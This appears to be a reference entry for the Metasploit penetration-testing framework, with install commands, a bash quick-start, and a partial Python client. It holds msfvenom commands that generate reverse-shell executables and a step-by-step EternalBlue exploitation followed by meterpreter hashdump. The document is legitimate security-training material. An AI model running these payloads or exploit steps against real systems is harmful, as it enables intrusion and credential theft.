authentication.notes: COMPLETELY FREE! Open source framework. Download and run locally. No registration or license required for Framework edition.

description: Metasploit Framework - FREE, open source penetration testing framework. The world's most used penetration testing framework for finding, exploiting, and validating vulnerabilities.

bash.msf_quick_start:
#!/bin/bash
# Metasploit Quick Start - FREE!

echo "[*] Metasploit Framework (COMPLETELY FREE!)"
echo "========================================="
echo ""

echo "[+] Installation:"
echo "   # Kali (Pre-installed)"
echo "   msfconsole"
echo ""
echo "   # Ubuntu/Debian"
echo "   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall"
echo "   chmod 755 msfinstall && ./msfinstall"
echo ""
echo "   # macOS"
echo "   brew install metasploit"
echo ""

echo "[+] Basic Commands:"
echo "   # Start console"
echo "   msfconsole"
echo ""
echo "   # Update framework"
echo "   msfupdate"
echo ""
echo "   # Search exploits"
echo "   search type:exploit platform:windows"
echo ""
echo "   # Use exploit"
echo "   use exploit/windows/smb/ms17_010_eternalblue"
echo ""

echo "[+] Generate Payloads:"
echo "   # Windows reverse shell"
echo "   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe"
echo ""
echo "   # Linux reverse shell"
echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf"
echo ""

echo "[+] Module Stats:"
echo "   - 3000+ Exploits"
echo "   - 1100+ Auxiliary"
echo "   - 600+ Payloads"
echo "   - 400+ Post modules"
echo ""

echo "[+] Resources:"
echo "   - Website: https://www.metasploit.com/"
echo "   - Docs: https://docs.metasploit.com/"
echo "   - GitHub: https://github.com/rapid7/metasploit-framework"
echo ""

echo "[!] 100% FREE - No license required!"

curl.install_msf:
# Install Metasploit on Linux - FREE!
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

python.msf_automation:
#!/usr/bin/env python3
import msgpack
import http.client
import ssl
import base64
import time
from typing import Dict, List

class MetasploitClient:
    """Metasploit Framework Client - COMPLETELY FREE!"""
    
    def __init__(self, password='msf', port=55553):
        self.host = '127.0.0.1'
        self.port = port
        self.password = password
        self.token = None
        self.console_id = None
        
    def framework_overview(self):
        """Metasploit Framework overview (FREE!)"""
        print("== Metasploit Framework Overview (COMPLETELY FREE!)\n")
        
        print("[+] Framework Statistics:\n")
        stats = {
            'Exploits': '3000+',
            'Auxiliary': '1100+',
            'Post': '400+',
            'Payloads': '600+',
            'Encoders': '50+',
            'Nops': '10+'
        }
        
        for module_type, count in stats.items():
            print(f"    - {module_type}: {count}")
        
        print("\n[+] Popular Modules:\n")
        modules = [
            'exploit/windows/smb/ms17_010_eternalblue',
            'exploit/windows/smb/ms08_067_netapi',
            'exploit/multi/handler',
            'auxiliary/scanner/smb/smb_version',
            'auxiliary/scanner/portscan/tcp',
            'post/windows/gather/hashdump',
            'exploit/multi/http/apache_struts2_rest_xstream'
        ]
        
        for module in modules:
            print(f"    - {module}")
        
        return stats
    
    def basic_workflow(self):
        """Basic Metasploit workflow (FREE!)"""
        print("== Basic Metasploit Workflow (FREE!)\n")
        
        print("1. Start Metasploit:\n")
        print("   $ msfconsole\n")
        
        print("2. Search for exploits:\n")
        print("   msf6 > search type:exploit platform:windows smb\n")
        
        print("3. Select an exploit:\n")
        print("   msf6 > use exploit/windows/smb/ms17_010_eternalblue\n")
        
        print("4. Configure options:\n")
        print("   msf6 exploit(ms17_010_eternalblue) > show options")
        print("   msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100")
        print("   msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10\n")
        
        print("5. Select payload:\n")
        print("   msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp\n")
        
        print("6. Run exploit:\n")
        print("   msf6 exploit(ms17_010_eternalblue) > exploit\n")
        
        print("7. Post-exploitation:\n")
        print("   meterpreter > sysinfo")
        print("   meterpreter > hashdump")
        print("   meterpreter > screenshot\n")
